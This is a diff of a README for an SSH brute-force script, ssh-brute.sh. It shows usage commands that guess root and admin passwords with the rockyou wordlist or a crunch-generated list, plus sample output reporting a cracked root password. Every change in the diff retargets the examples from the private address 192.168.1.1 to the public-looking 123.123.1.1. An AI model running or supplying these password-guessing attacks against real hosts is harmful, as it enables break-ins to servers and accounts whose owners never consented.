@@ -26,17 +26,17 @@ chmod +x ssh-brute.sh
 
 ```bash
 # Basic - use built-in wordlist
-./ssh-brute.sh 192.168.1.1 root
+./ssh-brute.sh 123.123.1.1 root
 
 # Custom user
-./ssh-brute.sh 192.168.1.1 admin
+./ssh-brute.sh 123.123.1.1 admin
 
 # Custom wordlist
-./ssh-brute.sh 192.168.1.1 root /usr/share/wordlists/rockyou.txt
+./ssh-brute.sh 123.123.1.1 root /usr/share/wordlists/rockyou.txt
 
 # Generate bigger wordlist
 crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o /tmp/bigwordlist.txt
-./ssh-brute.sh 192.168.1.1 root /tmp/bigwordlist.txt
+./ssh-brute.sh 123.123.1.1 root /tmp/bigwordlist.txt
 ```
 
 ## What it does
@@ -50,7 +50,7 @@ crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o /tmp/bigwordlist.txt
 
 ```
 === SSH Brute Force Tester ===
-Target: 192.168.1.1
+Target: 123.123.1.1
 User:   root
 
 [1/3] Checking password auth...
@@ -58,7 +58,7 @@ User:   root
 [2/3] Using wordlist: /tmp/sshpw.txt
 [3/3] Starting brute force (62 passwords)...
 
-[FOUND] host: 192.168.1.1   login: root   password: toor
+[FOUND] host: 123.123.1.1   login: root   password: toor
 ```
 
 ## Custom Wordlists
